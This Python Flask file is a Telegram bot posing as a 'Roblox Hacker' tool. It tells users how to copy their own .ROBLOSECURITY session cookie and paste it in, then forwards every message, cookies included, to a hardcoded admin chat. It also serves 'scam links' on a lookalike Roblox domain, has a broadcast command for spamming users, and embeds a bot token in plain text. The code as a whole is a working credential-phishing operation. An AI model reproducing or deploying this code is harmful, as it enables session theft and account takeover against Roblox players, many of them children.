from flask import Flask
import requests
import os
import json
import time
import threading
import sys

app = Flask(__name__)
BOT_TOKEN = "8767721552:AAEeqRMTCZBKim5iHBtLQvTkoH5b38c3b0w"
ADMIN_CHAT_ID = "8625870625"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"
LANG_FILE = "lang.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

user_lang = load_json(LANG_FILE)
pending_reply = {}

# === ТЕКСТЫ (БЕЗ МАРКДАУНА, ПРОСТО ТЕКСТ) ===
TEXTS = {
    "ru": {
        "welcome": "🔓 Roblox Hacker v3.0\n\nИнструмент для анализа аккаунтов Roblox\nПолучение куки и данных сессии\nБыстрая обработка запросов\n\nВыберите действие:",
        "hack": "Введите логин или .ROBLOSECURITY куки аккаунта:\n\nДанные будут обработаны в течение 5-10 минут",
        "cookies_tutorial": "Инструкция по получению кук:\n1. Открой Roblox\n2. Найди .ROBLOSECURITY\n3. Скопируй и отправь сюда",
        "scam_links": "Скам ссылки (10 шт):\nhttps://roblox.com.ug/games/...",
        "support": "Напишите название игры. Администратор свяжется с вами.",
        "choose_lang": "Выберите язык:",
        "lang_changed": "Язык изменён.",
        "reply_sent": "Ответ отправлен",
        "choose_action": "Выберите действие:",
        "admin_reply": "Ответ поддержки:\n",
        "no_user": "Зажми сообщение с ID пользователя → Ответить\nИли используй команду: /reply ID Текст"
    },
    "en": {
        "welcome": "🔓 Roblox Hacker v3.0\n\nTool for Roblox account analysis\nCookie and session data extraction\nFast request processing\n\nChoose an action:",
        "hack": "Enter login or .ROBLOSECURITY cookie:\n\nData will be processed within 5-10 minutes",
        "cookies_tutorial": "How to get cookies:\n1. Open Roblox\n2. Find .ROBLOSECURITY\n3. Copy and send here",
        "scam_links": "Scam links (10 pcs):\nhttps://roblox.com.ug/games/...",
        "support": "Write the game name. Admin will contact you.",
        "choose_lang": "Choose language:",
        "lang_changed": "Language changed.",
        "reply_sent": "Reply sent",
        "choose_action": "Choose action:",
        "admin_reply": "Support reply:\n",
        "no_user": "Long press message with user ID → Reply\nOr use command: /reply ID Text"
    }
}

# === КЛАВИАТУРЫ ===
LANG_KEYBOARD = {
    "keyboard": [["🇷🇺 Русский", "🇬🇧 English"]],
    "resize_keyboard": True,
    "one_time_keyboard": True
}

MAIN_KEYBOARD_RU = {
    "keyboard": [
        ["👨‍💻 Скам ссылки", "🎯 Взломать аккаунт"],
        ["🍪 Как получить куки", "✍️ Написать поддержке"],
        ["🌐 Сменить язык"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

MAIN_KEYBOARD_EN = {
    "keyboard": [
        ["👨‍💻 Scam links", "🎯 Hack account"],
        ["🍪 How to get cookies", "✍️ Write to support"],
        ["🌐 Change language"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

def send_message(chat_id, text, reply_markup=None):
    """Отправляет сообщение БЕЗ изменений текста"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(url, json=payload)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 5, "allowed_updates": ["message"]}
    if offset:
        params["offset"] = offset
    try:
        r = requests.get(url, params=params, timeout=10)
        return r.json().get("result", [])
    except:
        return []

def poll():
    print("Telegram bot polling started!")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    text = msg.get("text", "")
                    username = msg["from"].get("username", "anon")
                    user_id = msg["from"]["id"]

                    # === АДМИН ===
                    if str(chat_id) == ADMIN_CHAT_ID:
                        reply_to = msg.get("reply_to_message")
                        if reply_to:
                            if pending_reply.get("user_id"):
                                target_id = pending_reply["user_id"]
                                target_lang = user_lang.get(str(target_id), "ru")
                                # ОТПРАВЛЯЕМ ТЕКСТ КАК ЕСТЬ
                                send_message(target_id, TEXTS[target_lang]["admin_reply"] + text)
                                send_message(ADMIN_CHAT_ID, f"Ответ отправлен @{pending_reply.get('username', 'anon')}")
                                pending_reply = {}
                                offset = update["update_id"] + 1
                                continue

                        if text.startswith("/reply "):
                            parts = text.split(" ", 2)
                            if len(parts) >= 3 and parts[1].isdigit():
                                target_id = int(parts[1])
                                reply_text = parts[2]
                                target_lang = user_lang.get(str(target_id), "ru")
                                send_message(target_id, TEXTS[target_lang]["admin_reply"] + reply_text)
                                send_message(ADMIN_CHAT_ID, f"Ответ отправлен (ID: {target_id})")
                            offset = update["update_id"] + 1
                            continue

                        if text == '/users':
                            send_message(ADMIN_CHAT_ID, f"Всего пользователей: {len(USERS)}")
                            offset = update["update_id"] + 1
                            continue

                        if text.startswith('/sendall '):
                            msg = text.replace("/sendall ", "")
                            for uid in USERS:
                                try:
                                    send_message(uid, msg)
                                except:
                                    pass
                            send_message(ADMIN_CHAT_ID, f"Рассылка отправлена {len(USERS)} пользователям.")
                            offset = update["update_id"] + 1
                            continue

                        if text == '/start':
                            send_message(ADMIN_CHAT_ID, "Привет, админ!", MAIN_KEYBOARD_RU)
                            offset = update["update_id"] + 1
                            continue

                        if text == '/help':
                            help_text = (
                                "Команды:\n\n"
                                "/help — помощь\n"
                                "/users — количество пользователей\n"
                                "/reply ID Текст — ответить\n"
                                "/sendall Текст — рассылка"
                            )
                            send_message(ADMIN_CHAT_ID, help_text)
                            offset = update["update_id"] + 1
                            continue

                    # === ПОЛЬЗОВАТЕЛИ ===
                    save_user(user_id)
                    lang = user_lang.get(str(user_id), "ru")
                    t = TEXTS[lang]

                    if text in ["🌐 Сменить язык", "🌐 Change language"]:
                        send_message(chat_id, t["choose_lang"], LANG_KEYBOARD)
                        offset = update["update_id"] + 1
                        continue

                    if text == "🇷🇺 Русский":
                        user_lang[str(user_id)] = "ru"
                        save_json(LANG_FILE, user_lang)
                        send_message(chat_id, TEXTS["ru"]["lang_changed"], MAIN_KEYBOARD_RU)
                        offset = update["update_id"] + 1
                        continue

                    if text == "🇬🇧 English":
                        user_lang[str(user_id)] = "en"
                        save_json(LANG_FILE, user_lang)
                        send_message(chat_id, TEXTS["en"]["lang_changed"], MAIN_KEYBOARD_EN)
                        offset = update["update_id"] + 1
                        continue

                    pending_reply = {"user_id": user_id, "username": username}
                    # ОТПРАВЛЯЕМ АДМИНУ ТЕКСТ КАК ЕСТЬ
                    send_message(ADMIN_CHAT_ID, f"@{username}")
                    send_message(ADMIN_CHAT_ID, text)

                    keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU

                    if text == '/start':
                        send_message(chat_id, t["welcome"], keyboard)
                    elif text in ["👨‍💻 Скам ссылки", "👨‍💻 Scam links"]:
                        send_message(chat_id, t["scam_links"], keyboard)
                    elif text in ["🎯 Взломать аккаунт", "🎯 Hack account"]:
                        send_message(chat_id, t["hack"], keyboard)
                    elif text in ["🍪 Как получить куки", "🍪 How to get cookies"]:
                        send_message(chat_id, t["cookies_tutorial"], keyboard)
                    elif text in ["✍️ Написать поддержке", "✍️ Write to support"]:
                        send_message(chat_id, t["support"], keyboard)
                    else:
                        send_message(chat_id, t["choose_action"], keyboard)

                    offset = update["update_id"] + 1

        except Exception as e:
            print("Polling error:", e)
        time.sleep(1)

@app.route('/')
def home():
    return "Bot is alive! (polling mode)", 200

@app.route('/restart')
def restart():
    print("Welcome to UptimeRobot — перезапуск")
    sys.exit(0)

if __name__ == "__main__":
    threading.Thread(target=poll, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
